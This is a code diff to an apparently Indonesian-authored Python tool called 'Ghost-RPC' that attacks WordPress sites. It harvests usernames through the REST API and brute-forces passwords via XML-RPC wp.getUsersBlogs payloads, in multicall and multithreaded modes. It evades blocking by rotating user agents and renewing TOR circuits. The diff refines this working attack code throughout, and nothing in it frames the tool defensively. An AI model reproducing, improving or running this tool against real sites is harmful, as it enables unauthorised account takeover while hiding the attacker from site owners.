@@ -27,7 +27,6 @@ user_agents = [
     "curl/8.14.1"
 ]
 
-# ndasmu
 sys.stdout.write("\x1b]2;Ghost-RPC MODE - By Official Marz57\x07")
 sys.stdout.flush()
 
@@ -73,7 +72,6 @@ def renew_tor_ip():
         print(colored(f"[!] Gagal mengganti IP TOR: {e}", "red"))
         return False
 
-# sek ngonsep
 def scan_wp_usernames(url, use_tor):
     """Mencoba mengambil daftar username via WordPress REST API secara otomatis"""
     usernames = []
@@ -119,11 +117,8 @@ def check_xmlrpc(url, use_tor):
     
     try:
         s = session(use_tor)
-        # Cek 1: GET Request
         r = s.get(url, timeout=10)
         print(f"HTTP Status : {r.status_code}")
-        
-        # Cek 2: POST Request
         print(colored("\n[*] Tes Fungsi system.listMethods...", "cyan"))
         payload = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
         headers = {'Content-Type': 'text/xml'}
@@ -139,7 +134,6 @@ def check_xmlrpc(url, use_tor):
 
     input("\nTekan ENTER untuk kembali ke masalalu...")
 
-# ngeces sek
 def test_rate_limit(url, use_tor, count):
     clear_screen()
     print_logo()
@@ -193,7 +187,6 @@ def build_multicall_payload(username, passwords):
 def single_payload(username, password):
     return f"""<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>"""
 
-# pikiren dewe
 def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
     clear_screen()
     print_logo()
@@ -203,6 +196,8 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
     print(f"Target Users: [{colored(', '.join(target_usernames), 'green') if target_usernames else colored('Kosong / Protected', 'red')}]")
     print(f"Connection  : {colored('TOR' if use_tor else 'DIRECT', 'green')}")
     
+    print(colored("[*] Mengambil IP saat ini...", "cyan"))
+    current_ip = get_ip(use_tor)
 
     if target_usernames:
         print(colored(f"[!] Terdeteksi {len(target_usernames)} target username otomatis: {', '.join(target_usernames)}", "green"))
@@ -221,7 +216,9 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
         input(colored("\n[!] File wordlist tidak ditemukan! Tekan ENTER...", "red"))
         return
 
-    mode = "single" if input("Pilih Mode Brute [1. multicall (default) / 2. single]: ").strip() == "2" else "multicall"
+    mode_input = input("Pilih Mode Brute [1. multicall (default) / 2. single]: ").strip()
+    mode = "single" if mode_input == "2" else "multicall"
+    
     threads = 3
     if mode == "single":
         t_input = input("Jumlah Threads [default 3]: ").strip()
@@ -229,7 +226,7 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
             try: threads = int(t_input)
             except ValueError: pass
 
-    with open(wordlist_path, 'r') as f:
+    with open(wordlist_path, 'r', encoding='latin-1') as f:
         passwords = [line.strip() for line in f if line.strip()]
 
     if use_tor:
@@ -238,16 +235,24 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
         while not init_ready:
             check_s = session(use_tor)
             try:
-                r_test = check_s.head(url, timeout=7, verify=False)
+                dummy_payload = "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
+                headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
+                
+                r_test = check_s.post(url, data=dummy_payload, headers=headers, timeout=10, verify=False)
+
                 if r_test.status_code in [200, 405]: 
                     init_ready = True
                     check_s.close()
-                else: raise Exception()
+                else: 
+                    raise Exception()
             except:
                 check_s.close()
                 print(colored(f"[!] IP Awal [{current_ip}] bermasalah. Mencari sirkuit TOR baru...", "red"))
-                if renew_tor_ip(): time.sleep(4); current_ip = get_ip(use_tor)
+                if renew_tor_ip(): 
+                    time.sleep(4)
+                    current_ip = get_ip(use_tor)
         print(colored(f"🌐 [JALUR AMAN] Siap menyerang dengan IP: {current_ip}", "green"))
+
 
     print(colored(f"\n[*] Menjalankan serangan ke {url}...", "yellow"))
     s = session(use_tor)
@@ -316,7 +321,6 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
                     continue 
                 time.sleep(random.uniform(1.0, 2.5))
 
-#dewean
         elif mode == "single":
             idx = 0
             while idx < len(passwords):
@@ -330,6 +334,7 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
                 errors_detected = []
                 
                 def worker(pwd):
+                    nonlocal current_ip  
                     if stop_event.is_set(): return
                     headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
                     xml = single_payload(username, pwd)
@@ -345,7 +350,7 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
                                     stop_event.set()
                                     nonlocal success_flag; success_flag = True
                         else:
-                            print(f"🔍 {username}:{pwd} -> HTTP {r.status_code} (Status HTTP Asing")
+                            print(f"🔍 {username}:{pwd} -> HTTP {r.status_code} (Status HTTP Asing)")
                             with lock: errors_detected.append(f"http_{r.status_code}")
                     except:
                         with lock: errors_detected.append("blocked")
@@ -371,22 +376,27 @@ def run_bruteforce(url, use_tor, target_usernames, xmlrpc_status):
                                     try:
                                         dummy = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
                                         r_test = check_s.post(url, data=dummy, headers={'Content-Type': 'text/xml'}, timeout=8, verify=False)
-                                        if r_test.status_code == 200: current_ip = get_ip(use_tor); tor_ready = True; check_s.close(); break
-                                    except: check_s.close()
+                                        if r_test.status_code == 200: 
+                                            current_ip = get_ip(use_tor)
+                                            tor_ready = True
+                                            check_s.close()
+                                            break
+                                    except: 
+                                        check_s.close()
                                 if tor_ready: break
                             time.sleep(3)
                         s = session(use_tor)
-                        print(colored(f"🌐 [TOR SUCCESS] IP Baru Aktif: {current_ip}. Mengulang window...", "green"))
+                        print(colored(f"🌐 [TOR SUCCESS] IP Baru Aktif: {current_ip}. Mengulang window {window_count}...", "green"))
                     else:
                         print(colored("[!] Terdeteksi error. Menunggu 10 detik...", "yellow")); time.sleep(10)
                     continue
-                else: idx += threads
+                else: 
+                    idx += threads
 
     if success_flag: print(colored("\n[+] Bruteforce Sukses! Hasil tersimpan di success.txt", "green"))
     else: print(colored("\n[-] Bruteforce Selesai! Tidak ada password yang cocok.", "red"))
     input("\nTekan ENTER untuk kembali...")
-    
-# menu ku dewe
+
 def tor_menu():
     clear_screen()
     print_logo()
@@ -426,15 +436,11 @@ def main_menu(initial_url):
     print(colored(f"[*] Menghubungkan ke target: {url}...", "cyan"))
     print(colored("[*] Memeriksa status XML-RPC dan scanning user awal (Mohon tunggu)...", "yellow"))
 
-    try:
-        target_usernames = scan_wp_usernames(url, use_tor)
-    except:
-        target_usernames = []
+    try: target_usernames = scan_wp_usernames(url, use_tor)
+    except: target_usernames = []
         
-    try:
-        xmlrpc_status = get_xmlrpc_status_simple(url, use_tor)
-    except:
-        xmlrpc_status = colored("DOWN / TIMEOUT", "red")
+    try: xmlrpc_status = get_xmlrpc_status_simple(url, use_tor)
+    except: xmlrpc_status = colored("DOWN / TIMEOUT", "red")
     
     while True:
         clear_screen(); print_logo()
